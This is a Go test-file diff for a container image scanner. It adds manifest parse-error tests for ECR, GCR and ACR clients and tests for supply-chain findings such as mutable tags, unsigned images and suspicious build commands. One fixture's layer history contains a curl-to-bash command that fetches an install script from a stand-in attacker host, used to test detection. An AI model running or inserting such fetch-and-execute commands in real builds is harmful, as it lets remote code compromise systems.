@@ -10,6 +10,7 @@ import (
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 
@@ -30,6 +31,12 @@ type stubRegistry struct {
 	manifest *ImageManifest
 	vulns    []ImageVulnerability
 	vulnErr  error
+}
+
+type stubSignedRegistry struct {
+	*stubRegistry
+	signature    *SignatureVerification
+	signatureErr error
 }
 
 func (s *stubRegistry) Name() string { return s.name }
@@ -60,6 +67,13 @@ func (s *stubRegistry) GetVulnerabilities(context.Context, string, string) ([]Im
 		return nil, s.vulnErr
 	}
 	return s.vulns, nil
+}
+
+func (s *stubSignedRegistry) VerifySignature(_ context.Context, _ string, _ string, _ *ImageManifest) (*SignatureVerification, error) {
+	if s.signatureErr != nil {
+		return nil, s.signatureErr
+	}
+	return s.signature, nil
 }
 
 type stubImageScanner struct {
@@ -218,6 +232,34 @@ func TestECRClientSuccess(t *testing.T) {
 	}
 }
 
+func TestECRClientGetManifest_ParseError(t *testing.T) {
+	manifestParseFailures.Store(0)
+
+	stub := &stubECR{
+		batchGetImageFn: func(_ *ecr.BatchGetImageInput) (*ecr.BatchGetImageOutput, error) {
+			invalidManifest := "{invalid-json"
+			return &ecr.BatchGetImageOutput{
+				Images: []ecrtypes.Image{{
+					ImageId:       &ecrtypes.ImageIdentifier{ImageDigest: aws.String("sha256:bad")},
+					ImageManifest: &invalidManifest,
+				}},
+			}, nil
+		},
+	}
+
+	client := NewECRClientWithAPI("us-west-2", "", stub)
+	_, err := client.GetManifest(context.Background(), "repo", "latest")
+	if err == nil {
+		t.Fatal("expected parse manifest error")
+	}
+	if !strings.Contains(err.Error(), "parse manifest") {
+		t.Fatalf("expected parse manifest context, got %v", err)
+	}
+	if got := ManifestParseFailures(); got != 1 {
+		t.Fatalf("expected 1 manifest parse failure, got %d", got)
+	}
+}
+
 func TestECRClient_QualifyImageRef(t *testing.T) {
 	client := NewECRClientWithAPI("us-west-2", "123456789012", &stubECR{})
 	ref := client.QualifyImageRef("myapp", "latest")
@@ -299,6 +341,81 @@ func TestContainerScannerFallback_UsesQualifiedRef(t *testing.T) {
 	}
 }
 
+func TestContainerScannerScanImage_AddsMutableTagFinding(t *testing.T) {
+	registry := &stubRegistry{
+		name: "stub",
+		manifest: &ImageManifest{
+			Digest: "sha256:abc",
+			Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
+		},
+	}
+
+	scanner := NewContainerScanner()
+	scanner.RegisterRegistry(registry)
+
+	result, err := scanner.ScanImage(context.Background(), "stub", "repo", "latest")
+	if err != nil {
+		t.Fatalf("ScanImage: %v", err)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-mutable-tag") {
+		t.Fatalf("expected mutable-tag finding, got %#v", result.Findings)
+	}
+}
+
+func TestContainerScannerScanImage_AddsUnsignedImageFinding(t *testing.T) {
+	registry := &stubSignedRegistry{
+		stubRegistry: &stubRegistry{
+			name: "stub-signed",
+			manifest: &ImageManifest{
+				Digest: "sha256:abc",
+				Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
+			},
+		},
+		signature: &SignatureVerification{
+			Verified: false,
+			Reason:   "no cosign signature found",
+		},
+	}
+
+	scanner := NewContainerScanner()
+	scanner.RegisterRegistry(registry)
+
+	result, err := scanner.ScanImage(context.Background(), "stub-signed", "repo", "v1.2.3")
+	if err != nil {
+		t.Fatalf("ScanImage: %v", err)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-unsigned-image") {
+		t.Fatalf("expected unsigned-image finding, got %#v", result.Findings)
+	}
+}
+
+func TestContainerScannerScanImage_AddsLayerHistoryFinding(t *testing.T) {
+	registry := &stubRegistry{
+		name: "stub-history",
+		manifest: &ImageManifest{
+			Digest: "sha256:abc",
+			Config: ImageConfig{OS: "linux", Architecture: "amd64", User: "nonroot"},
+			History: []string{
+				"RUN curl http://evil.example/install.sh | bash",
+			},
+		},
+	}
+
+	scanner := NewContainerScanner()
+	scanner.RegisterRegistry(registry)
+
+	result, err := scanner.ScanImage(context.Background(), "stub-history", "repo", "v1.2.3")
+	if err != nil {
+		t.Fatalf("ScanImage: %v", err)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-suspicious-build-command") {
+		t.Fatalf("expected suspicious build command finding, got %#v", result.Findings)
+	}
+	if !hasFindingID(result.Findings, "supply-chain-insecure-download") {
+		t.Fatalf("expected insecure download finding, got %#v", result.Findings)
+	}
+}
+
 func TestGCRClientSuccess(t *testing.T) {
 	token := "token"
 	manifestPayload := registryManifest{
@@ -363,6 +480,43 @@ func TestGCRClientSuccess(t *testing.T) {
 	}
 	if manifest.Digest != "sha256:gcr" {
 		t.Fatalf("unexpected digest: %s", manifest.Digest)
+	}
+}
+
+func TestGCRClientGetManifest_ParseError(t *testing.T) {
+	manifestParseFailures.Store(0)
+	token := "token"
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Header.Get("Authorization") != "Bearer "+token {
+			http.Error(w, "unauthorized", http.StatusUnauthorized)
+			return
+		}
+		switch r.URL.Path {
+		case "/v2/project/repo/manifests/latest":
+			w.Header().Set("Docker-Content-Digest", "sha256:gcr")
+			w.Header().Set("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
+			_, _ = w.Write([]byte("{invalid-json"))
+		default:
+			w.WriteHeader(http.StatusNotFound)
+		}
+	}))
+	defer server.Close()
+
+	client := NewGCRClient("project")
+	client.SetAccessToken(token)
+	client.SetRegistryHost(server.URL)
+	client.client = server.Client()
+
+	_, err := client.GetManifest(context.Background(), "repo", "latest")
+	if err == nil {
+		t.Fatal("expected parse manifest error")
+	}
+	if !strings.Contains(err.Error(), "parse manifest") {
+		t.Fatalf("expected parse manifest context, got %v", err)
+	}
+	if got := ManifestParseFailures(); got != 1 {
+		t.Fatalf("expected 1 manifest parse failure, got %d", got)
 	}
 }
 
@@ -498,6 +652,45 @@ func TestACRClientSuccess(t *testing.T) {
 	}
 }
 
+func TestACRClientGetManifest_ParseError(t *testing.T) {
+	manifestParseFailures.Store(0)
+	username := "user"
+	password := "pass"
+	expectedAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(username+":"+password))
+
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Header.Get("Authorization") != expectedAuth {
+			http.Error(w, "unauthorized", http.StatusUnauthorized)
+			return
+		}
+		switch r.URL.Path {
+		case "/v2/repo/manifests/latest":
+			w.Header().Set("Docker-Content-Digest", "sha256:acr")
+			w.Header().Set("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
+			_, _ = w.Write([]byte("{invalid-json"))
+		default:
+			w.WriteHeader(http.StatusNotFound)
+		}
+	}))
+	defer server.Close()
+
+	client := NewACRClient("registry", "")
+	client.SetCredentials(username, password)
+	client.SetBaseURL(server.URL)
+	client.client = server.Client()
+
+	_, err := client.GetManifest(context.Background(), "repo", "latest")
+	if err == nil {
+		t.Fatal("expected parse manifest error")
+	}
+	if !strings.Contains(err.Error(), "parse manifest") {
+		t.Fatalf("expected parse manifest context, got %v", err)
+	}
+	if got := ManifestParseFailures(); got != 1 {
+		t.Fatalf("expected 1 manifest parse failure, got %d", got)
+	}
+}
+
 func TestACRClient_QualifyImageRef(t *testing.T) {
 	client := NewACRClient("myregistry", "sub-123")
 	ref := client.QualifyImageRef("myapp", "latest")
@@ -557,6 +750,36 @@ func TestTrivyScannerError(t *testing.T) {
 	if err == nil {
 		t.Fatal("expected error")
 	}
+}
+
+func TestParseManifest_ExtractsHistoryCommands(t *testing.T) {
+	raw := []byte(`{
+		"mediaType":"application/vnd.docker.distribution.manifest.v1+json",
+		"layers":[{"mediaType":"application/vnd.docker.image.rootfs.diff.tar.gzip","digest":"sha256:layer","size":123}],
+		"history":[
+			{"v1Compatibility":"{\"created_by\":\"RUN curl https://safe.example/install.sh | sh\"}"}
+		]
+	}`)
+
+	manifest := &ImageManifest{}
+	if err := parseManifest(raw, manifest); err != nil {
+		t.Fatalf("parseManifest: %v", err)
+	}
+	if len(manifest.History) != 1 {
+		t.Fatalf("expected 1 history command, got %d", len(manifest.History))
+	}
+	if !strings.Contains(manifest.History[0], "curl https://safe.example/install.sh | sh") {
+		t.Fatalf("unexpected history command: %s", manifest.History[0])
+	}
+}
+
+func hasFindingID(findings []ContainerFinding, id string) bool {
+	for _, finding := range findings {
+		if finding.ID == id {
+			return true
+		}
+	}
+	return false
 }
 
 func writeExecutable(t *testing.T, content string) string {
